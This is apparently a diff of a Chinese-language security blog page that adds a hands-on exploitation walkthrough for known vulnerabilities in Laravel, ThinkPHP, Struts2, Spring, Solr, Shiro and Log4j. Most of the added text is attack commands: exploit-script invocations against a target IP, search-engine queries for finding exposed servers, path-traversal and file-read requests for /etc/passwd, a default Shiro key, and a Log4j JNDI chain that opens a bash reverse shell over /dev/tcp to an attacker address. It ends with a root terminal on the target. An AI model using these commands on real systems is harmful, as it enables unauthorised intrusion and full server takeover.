+<p>进入<code>服务攻防\Laravel\CVE-2021-3129-main</code></p>
+<p>执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python exp.py http://目标IP:端口
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="thinkphp">thinkphp
+</h3><p>#Thinkphp-3.X RCE-6.X RCE</p>
+<blockquote>
+<p>ThinkPHP是一套开源的、基于PHP的轻量级Web应用开发框架</p>
+</blockquote>
+<p>综合工具：武器库-Thinkphp专检（3-6版本）</p>
+<h4 id="cve-2018-1002015">CVE-2018-1002015
+</h4><p>one-fox的thinkphp综合利用工具，地址写进去检测，可以检测出漏洞</p>
+<p>选择thinkphp5.0 rce，命令写whoami即可</p>
+<h4 id="cnvd-2018-24942">CNVD-2018-24942
+</h4><p>one-fox的thinkphp综合利用工具，地址写进去检测，可以检测出漏洞</p>
+<h3 id="strutss2">struts（s2）
+</h3><blockquote>
+<p>Apache Struts2框架是一个使用JavaEE网络应用程序的Web框架。</p>
+<p>可能存在OGNL表达注入扩展，从而造成远程代码执行，风险极大。</p>
+</blockquote>
+<p>fofa搜索<code>app=&quot;struts2&quot;</code></p>
+<h4 id="struts2cve-2020-17530-代码执行-">struts2：CVE-2020-17530（ 代码执行 ）
+</h4><p><strong>要求：</strong> Apache Struts 2.0.0 - 2.5.25</p>
+<p>找到<code>服务攻防\struts2\s2-062-main</code></p>
+<p>当前目录执行：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python .<span class="se">\s</span>2-062.py --url http://目标IP:端口/ --cmd id
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>会出现信息</p>
+<h3 id="spring目录遍历">Spring（目录遍历）
+</h3><p>0.2.13之前版本存在路径遍历漏洞，攻击者可通过该缺陷读取系统任意文件。</p>
+<p>参考文献：<a class="link" href="https://blog.csdn.net/weixin_43165012/article/details/121152482"  target="_blank" rel="noopener"
+    >https://blog.csdn.net/weixin_43165012/article/details/121152482</a></p>
+<p>如果是Linux服务器</p>
+<p><code>http://目标IP:端口/manage/log/view?filename=etc/passwd&amp;base=../../../../../../</code></p>
+<p>如果是windows服务器</p>
+<p><code>http://目标IP:端口/manage/log/view?filename=/windows/win.ini&amp;base=../../../../../../../</code></p>
+<p>退格是为了确保退到根目录</p>
+<h3 id="solrcve-2019-17558命令执行">Solr：CVE-2019-17558（命令执行）
+</h3><blockquote>
+<p>主要基于HTTP和Apache Lucene实现的全文搜索服务器。</p>
+<p>历史漏洞：<a class="link" href="https://avd.aliyun.com/search?q=Solr"  target="_blank" rel="noopener"
+    >https://avd.aliyun.com/search?q=Solr</a></p>
+<p>黑盒特征：图标及端口8393</p>
+</blockquote>
+<p>fofa搜<code>port=&quot;8983&quot; &amp;&amp; title=&quot;Solr Admin&quot;</code></p>
+<p><strong>要求：</strong> Apache Solr 5.0.0版本至8.3.1</p>
+<p>找到<code>服务攻防\solr\solr_rce-master</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python2 solr_rce.py http://目标IP:端口 id
+</span></span><span class="line"><span class="cl"><span class="c1"># 可以发现内容</span>
+</span></span><span class="line"><span class="cl">python2 solr_rce.py http://目标IP:端口 <span class="s2">&#34;cat /etc/passwd&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="solrcve-2021-27905文件读取ssrf">Solr：CVE-2021-27905（文件读取&amp;SSRF）
+</h3><blockquote>
+<p>全版本官方拒绝修复漏洞</p>
+</blockquote>
+<h4 id="获取数据库名">获取数据库名
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">http://目标IP:端口/solr/admin/cores?indexInfo<span class="o">=</span>false<span class="p">&amp;</span><span class="nv">wt</span><span class="o">=</span>json
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以获取status的name为demo</p>
+<h4 id="访问触发">访问触发
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i -s -k -X <span class="s1">$&#39;POST&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    -H <span class="s1">$&#39;Content-Type: application/json&#39;</span> --data-binary <span class="s1">$&#39;{\&#34;set-property\&#34;:{\&#34;requestDispatcher.requestParsers.enableRemoteStreaming\&#34;:true}}&#39;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    <span class="s1">$&#39;http://目标IP:端口/solr/demo/config&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="任意文件读取">任意文件读取
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -i -s -k <span class="s1">&#39;http://目标IP:端口/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="shirocve-2016-4437命令执行">shiro：CVE-2016-4437(命令执行)
+</h3><blockquote>
+<p>ava安全框架，能够用于身份验证、授权、加密和会话管理。</p>
+<p>历史漏洞：<a class="link" href="https://avd.aliyun.com/search?q=Shiro"  target="_blank" rel="noopener"
+    >https://avd.aliyun.com/search?q=Shiro</a></p>
+<p>黑盒特征：数据包cookie里面rememberMe</p>
+</blockquote>
+<p>利用one-fox工具箱中的shiro-attack工具。</p>
+<p>目标地址写<code>http://目标IP:端口/</code></p>
+<p>请求头Abc: 123，post数据a=123</p>
+<p>爆破密钥kPH+bIxk5D2deZiIxcaaaA==</p>
+<p>爆破利用链和回显，发现common2和AllEcho</p>
+<h3 id="log4jcve-2021-44228远程命令执行">log4j：CVE-2021-44228（远程命令执行）
+</h3><blockquote>
+<p>Apache的一个开源项目，是一个基于Java的日志记录框架。</p>
+<p>历史漏洞：<a class="link" href="https://avd.aliyun.com/search?q=Log4j"  target="_blank" rel="noopener"
+    >https://avd.aliyun.com/search?q=Log4j</a></p>
+<p>黑盒特征：盲打 会问蓝队攻击特征（关键词<code>${jndi:rmi:///osutj8}</code>）</p>
+</blockquote>
+<p><strong>要求：</strong> Apache Log4j2 2.0 - 2.15.0-rc1</p>
+<p>在dnslog平台获取一个域名，制作payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">${jndi:ldap://域名}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>将上面的payloadURL编码后拼接在<code>http://目标IP:端口/hello?payload=</code>之后并访问</p>
+<p>发现dnslog有响应，说明漏洞存在</p>
+<hr>
+<p>构造第二个payload</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/攻击IP/5566 &lt;&amp;1&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>使用base64编码后拼接在下面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &#34;bash -c {echo,payload放在这里}|{base64,-d}|{bash,-i}&#34; -A 攻击IP
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>nc监听<code>nc -lvvp 5566</code></p>
+<p>进入<code>服务攻防\log4j</code>在当前目录执行上面拼接好的命令</p>
+<p>在命令行中返回的内容里选择tomcat 8+的地址作为payload，例如：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath):
+</span></span><span class="line"><span class="cl">rmi://192.168.80.134:1099/u8ebi9	//这个是地址
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>拼接到下面的地址中</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">http://192.168.80.151:42927/hello?payload=${jndi:插在这}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>同样把payload=后面的内容进行URL编码后直接访问，发现nc中有目标的root身份终端。</p>
+
 </section>
 
 
@@ -558,12 +954,12 @@
             
                 
 <article class="">
-    <a href="/p/11.5-%E5%85%B6%E4%BB%96%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/">
+    <a href="/p/1.25-%E6%9B%B4%E5%A4%9A%E6%9A%B4%E7%A0%B4xsscsrf%E5%92%8Csql/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.5 其他第三方库</h2>
+            <h2 class="article-title">1.25 更多暴破、XSS、CSRF和sql</h2>
         </div>
     </a>
 </article>
@@ -571,12 +967,12 @@
             
                 
 <article class="">
-    <a href="/p/11.4-jieba%E5%BA%93/">
+    <a href="/p/1.24-2-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.4 jieba库</h2>
+            <h2 class="article-title">1.24-2 弱类型比较漏洞及序列化与反序列化</h2>
         </div>
     </a>
 </article>
@@ -584,12 +980,12 @@
             
                 
 <article class="">
-    <a href="/p/11.3-random%E5%BA%93/">
+    <a href="/p/1.24-1-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.3 random库</h2>
+            <h2 class="article-title">1.24-1 文件包含漏洞和命令执行漏洞</h2>
         </div>
     </a>
 </article>
@@ -597,12 +993,12 @@
             
                 
 <article class="">
-    <a href="/p/11.2-turtle%E5%BA%93%E7%BB%98%E5%9B%BE/">
+    <a href="/p/1.23-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-3/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.2 turtle库绘图</h2>
+            <h2 class="article-title">1.23 SQL注入系列-3</h2>
         </div>
     </a>
 </article>
@@ -610,12 +1006,12 @@
             
                 
 <article class="">
-    <a href="/p/11.1-format%E6%A0%BC%E5%BC%8F%E5%8C%96%E8%BE%93%E5%87%BA/">
+    <a href="/p/1.22-sql%E6%B3%A8%E5%85%A5%E7%B3%BB%E5%88%97-2/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">11.1 format格式化输出</h2>
+            <h2 class="article-title">1.22 SQL注入系列-2</h2>
         </div>
     </a>
 </article>
